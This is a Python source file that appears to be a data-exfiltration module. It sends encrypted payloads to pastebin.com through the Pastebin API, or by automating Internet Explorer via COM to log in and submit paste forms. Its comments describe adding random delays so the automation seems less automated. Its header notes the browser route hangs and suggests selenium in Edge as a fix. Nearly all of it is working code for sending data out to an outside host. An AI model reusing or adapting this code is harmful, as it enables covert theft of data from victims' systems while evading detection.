'''
This code is not currently functional as Internet Explorer hangs while trying to reach pastebin.com/login. Nevertheless, it can likely be made completely functional
by using selenium to complete the otherwise working process in MS Edge.
'''

from asyncio import wait_for
from win32com import client

import os
import random
import requests
import time

username = ''
password = ''
api_dev_key = ''

'''
plain_paste() pastes 'contents' to the specified account on pastebin; this technique should be used with encrypted payloads only as it is public facing.
'''

def plain_paste(title, contents):                           # 'title' should be a filename and 'contents' should be the encrypted byte string returned by encrypt()
    login_url = 'https://pastebin.com/api/api_login.php'    # first endpoint
    login_data = {
        'api_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_password': password,
    }
    r = requests.post(login_url, data=login_data)               # this is the first of two requests; the response to this is the API key that is required to make the paste
    api_user_key = r.text                                       # extracting the returned API key

    paste_url = 'https://pastebin.com/api/api_post.php'     # second endpoint
    paste_data = {
        'api_paste_name': title,
        'api_paste_code': contents.decode(),                            # decoding is only required if an encrypted byte string is being pasted
        'api_dev_key': api_dev_key,
        'api_user_key': api_user_key,                                   # authentication relies on this parameter
        'api_option': 'paste',
        'api_paste_private': 0,
    }
    r = requests.post(paste_url, data=paste_data)                       # making the second POST request
    print(r.status_code)
    print(r.text)

def wait_for_browser(browser):                                              # making sure that the browser finishes it's events before we interfere
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)

def random_sleep():                                         # this function is used to make the browser seem less automated; it also allows the browser to execute tasks that might not register events with the DOM to signal that they are complete.
    time.sleep(random.randint(5,10))

def login(ie):
    full_doc = ie.Document.all                  # retrieve all elements in the DOM
    for elem in full_doc:                       # look for username and password fields
        if elem.id == 'loginform-username':
            elem.setAttribute('value', username)        # set the credential fields as appropriate
        elif elem.id == 'loginform-password':
            elem.setAttribute('value', password)

    random_sleep()                                      # introduce randomness to the process to seem less automated
    if ie.Document.forms[0].id == 'w0':
        ie.Document.forms[0].submit()                   # submit the form to login to pastebin.com
    wait_for_browser(ie)                                # wait for the browser to finish the event

def submit(ie, title, contents):                        # paste the actual payload; takes an instance of ie, file name (title) and encrypted bytestring (contents).
    full_doc = ie.Document.all
    for elem in full_doc:                               # parsing the DOM
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)           # filling in fields as required
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)

    if ie.Document.forms[0].id == 'w0':
        ie.Document.forms[0].submit()                   # submitting the form to paste the payload
    random_sleep()
    wait_for_browser(ie)                                # wait for the browser to finish the event

def ie_paste(title, contents):
    ie = client.Dispatch('InternetExplorer.Application')            # instantiate Internet Explorer
    ie.Visible = 1                                                  # this attribute controls whether the process is visible or not (1 visible, 0 not)

    ie.Navigate('https://pastebin.com/login')
    wait_for_browser(ie)
    login(ie)

    ie.Navigate('https://pastebin.com/')
    wait_for_browser(ie)
    submit(ie, title, contents.decode())            # .decode() is required if an encrypted, encoded byte string is being pasted

    ie.Quit()                                       # terminate the Internet Explorer instance before returning

if __name__ == "__main__":
    ie_paste('title', 'contents')